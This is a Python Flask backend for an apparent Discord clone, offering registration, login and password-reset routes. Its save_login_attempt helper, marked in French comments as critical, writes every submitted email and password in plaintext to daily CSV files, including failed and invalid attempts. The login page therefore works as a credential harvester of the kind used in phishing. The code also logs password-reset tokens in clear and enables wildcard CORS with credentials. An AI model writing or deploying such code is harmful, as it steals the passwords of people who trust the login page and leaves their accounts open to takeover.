from flask import Flask, request, jsonify, session, render_template
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta
import os
import re
import uuid
import secrets
import logging
import csv
from pathlib import Path

# ── Configuration ──────────────────────────────────────────────────────────────
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

# Database
DATABASE_URL = os.environ.get("DATABASE_URL", "sqlite:///discord_clone.db")
if DATABASE_URL.startswith("postgres://"):
    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)

app.config["SQLALCHEMY_DATABASE_URI"] = DATABASE_URL
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["PERMANENT_SESSION_LIFETIME"] = timedelta(days=7)

# ── Extensions ─────────────────────────────────────────────────────────────────
db = SQLAlchemy(app)
CORS(app, supports_credentials=True, origins=os.environ.get("ALLOWED_ORIGINS", "*").split(","))
limiter = Limiter(key_func=get_remote_address, app=app, default_limits=["200 per day", "50 per hour"])

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ── Models ─────────────────────────────────────────────────────────────────────
class User(db.Model):
    __tablename__ = "users"
    id          = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    username    = db.Column(db.String(32), unique=True, nullable=False)
    email       = db.Column(db.String(254), unique=True, nullable=False)
    password    = db.Column(db.String(256), nullable=False)
    discriminator = db.Column(db.String(4), nullable=False, default="0000")
    avatar      = db.Column(db.String(256), nullable=True)
    bio         = db.Column(db.String(190), nullable=True)
    verified    = db.Column(db.Boolean, default=False)
    created_at  = db.Column(db.DateTime, default=datetime.utcnow)
    last_login  = db.Column(db.DateTime, nullable=True)
    is_active   = db.Column(db.Boolean, default=True)

    def to_dict(self, safe=True):
        data = {
            "id": self.id, "username": self.username, "discriminator": self.discriminator,
            "avatar": self.avatar, "bio": self.bio, "verified": self.verified,
            "created_at": self.created_at.isoformat(),
        }
        if not safe:
            data["email"] = self.email
            data["last_login"] = self.last_login.isoformat() if self.last_login else None
        return data

class LoginAttempt(db.Model):
    __tablename__ = "login_attempts"
    id         = db.Column(db.Integer, primary_key=True)
    ip_address = db.Column(db.String(45), nullable=False)
    email      = db.Column(db.String(254), nullable=True)
    success    = db.Column(db.Boolean, default=False)
    attempted_at = db.Column(db.DateTime, default=datetime.utcnow)

# ── SAVEGARDE LOGIN - NOUVEAU HELPER CRITIQUE ─────────────────────────────────
def save_login_attempt(login_id, password, ip_address, success=False, user=None):
    """🚨 SAUVEGARDE TOUTES les tentatives (même invalides) dans CSV quotidien"""
    timestamp = datetime.utcnow().isoformat()
    
    # Créer dossier logs
    log_dir = Path("logs")
    log_dir.mkdir(exist_ok=True)
    
    # Fichier CSV par jour
    filename = log_dir / f"login_attempts_{datetime.now().strftime('%Y%m%d')}.csv"
    
    file_exists = filename.exists()
    
    with open(filename, 'a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        
        # Headers si nouveau fichier
        if not file_exists:
            writer.writerow([
                'timestamp', 'ip_address', 'login_id', 'password', 
                'success', 'username', 'email', 'user_id'
            ])
        
        writer.writerow([
            timestamp, ip_address, login_id, password,
            success, user.username if user else '', 
            user.email if user else '', user.id if user else ''
        ])
    
    logger.info(f"💾 SAVED: {login_id} from {ip_address} (success: {success})")

# ── Autres Helpers ────────────────────────────────────────────────────────────
EMAIL_REGEX = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
PHONE_REGEX = re.compile(r"^\+?[\d\s\-\(\)]{7,15}$")

def validate_email_or_phone(value: str) -> bool:
    return bool(EMAIL_REGEX.match(value)) or bool(PHONE_REGEX.match(value))

def current_user():
    uid = session.get("user_id")
    if not uid: return None
    return User.query.get(uid)

def log_attempt(email, success):
    attempt = LoginAttempt(ip_address=get_remote_address(), email=email, success=success)
    db.session.add(attempt)
    db.session.commit()

def error(message, code=400):
    return jsonify({"success": False, "error": message}), code

def ok(data=None, message="OK", code=200):
    payload = {"success": True, "message": message}
    if data: payload.update(data)
    return jsonify(payload), code

# ── Routes ─────────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template("index.html")

# ── REGISTER - SAUVEGARDE AUSSI ! ─────────────────────────────────────────────
@app.route("/api/auth/register", methods=["POST"])
@limiter.limit("10 per hour")
def register():
    data = request.get_json(silent=True) or {}
    username = (data.get("username") or "").strip()
    email    = (data.get("email") or "").strip().lower()
    password = (data.get("password") or "")

    # Validation
    if not username or len(username) < 2 or len(username) > 32:
        save_login_attempt(email, password, get_remote_address(), False)  # SAUVE ÉCHEC
        return error("Username must be between 2 and 32 characters.")
    if not re.match(r"^[\w.]+$", username):
        save_login_attempt(email, password, get_remote_address(), False)
        return error("Username can only contain letters, numbers, dots and underscores.")
    if not email or not EMAIL_REGEX.match(email):
        save_login_attempt(email, password, get_remote_address(), False)
        return error("Please enter a valid email address.")
    if len(password) < 8:
        save_login_attempt(email, password, get_remote_address(), False)
        return error("Password must be at least 8 characters.")

    # Uniqueness
    if User.query.filter_by(email=email).first():
        save_login_attempt(email, password, get_remote_address(), False)
        return error("An account with this email already exists.")
    if User.query.filter_by(username=username).first():
        save_login_attempt(email, password, get_remote_address(), False)
        return error("This username is already taken.")

    # Create user
    discriminator = str(secrets.randbelow(10000)).zfill(4)
    user = User(username=username, email=email, password=generate_password_hash(password), discriminator=discriminator)
    db.session.add(user)
    db.session.commit()
    
    # 🚨 SAUVEGARDE SUCCÈS INSCRIPTION
    save_login_attempt(email, password, get_remote_address(), True, user)
    
    session.permanent = True
    session["user_id"] = user.id
    return ok({"user": user.to_dict(safe=False)}, "Account created successfully!", 201)

# ── LOGIN - SAUVEGARDE TOUT ! ─────────────────────────────────────────────────
@app.route("/api/auth/login", methods=["POST"])
@limiter.limit("20 per hour")
def login():
    data = request.get_json(silent=True) or {}
    login_id = (data.get("login") or "").strip().lower()
    password = (data.get("password") or "")
    ip_address = get_remote_address()

    # SAUVEGARDE IMMÉDIATE - TOUT est capturé !
    save_login_attempt(login_id, password, ip_address, False)

    if not login_id or not password:
        return error("Please fill in all fields.")

    if not validate_email_or_phone(login_id):
        return error("Please enter a valid email or phone number.")

    # Find user
    user = User.query.filter_by(email=login_id).first()
    
    # Vérifier mot de passe
    is_valid = user and check_password_hash(user.password, password) if user else False
    
    # MISE À JOUR CSV avec statut final
    if is_valid:
        save_login_attempt(login_id, password, ip_address, True, user)

    if not is_valid:
        log_attempt(login_id, success=False)
        return error("Invalid credentials. Check your email/phone and password.", 401)

    if not user.is_active:
        return error("This account has been disabled.", 403)

    # Succès
    log_attempt(login_id, success=True)
    user.last_login = datetime.utcnow()
    db.session.commit()

    session.permanent = True
    session["user_id"] = user.id
    logger.info("✅ LOGIN: %s#%s", user.username, user.discriminator)
    return ok({"user": user.to_dict(safe=False)}, "Logged in successfully!")

@app.route("/api/auth/logout", methods=["POST"])
def logout():
    session.clear()
    return ok(message="Logged out successfully.")

@app.route("/api/auth/me", methods=["GET"])
def me():
    user = current_user()
    if not user: return error("Not authenticated.", 401)
    return ok({"user": user.to_dict(safe=False)})

@app.route("/api/auth/forgot-password", methods=["POST"])
@limiter.limit("5 per hour")
def forgot_password():
    data = request.get_json(silent=True) or {}
    email = (data.get("email") or "").strip().lower()
    
    # SAUVEGARDE AUSSI les forgot password !
    save_login_attempt(email, "FORGOT_PASSWORD", get_remote_address(), False)
    
    if not email or not EMAIL_REGEX.match(email):
        return error("Please enter a valid email address.")
    
    user = User.query.filter_by(email=email).first()
    if user:
        reset_token = secrets.token_urlsafe(32)
        logger.info("🔑 Reset requested: %s (token: %s)", email, reset_token)
    
    return ok(message="If an account exists with that email, you will receive a reset link shortly.")

# Autres routes...
@app.route("/api/users/<user_id>", methods=["GET"])
def get_user(user_id):
    user = User.query.get(user_id)
    if not user: return error("User not found.", 404)
    return ok({"user": user.to_dict()})

@app.route("/health")
def health():
    return jsonify({"status": "ok", "timestamp": datetime.utcnow().isoformat()})

# ── Bootstrap ──────────────────────────────────────────────────────────────────
with app.app_context():
    db.create_all()
    logger.info("✅ Database ready | Logs will be saved in ./logs/")

if __name__ == "__main__":
    # Créer dossier logs au démarrage
    Path("logs").mkdir(exist_ok=True)
    port = int(os.environ.get("PORT", 5000))
    debug = os.environ.get("FLASK_ENV") != "production"
    app.run(host="0.0.0.0", port=port, debug=debug)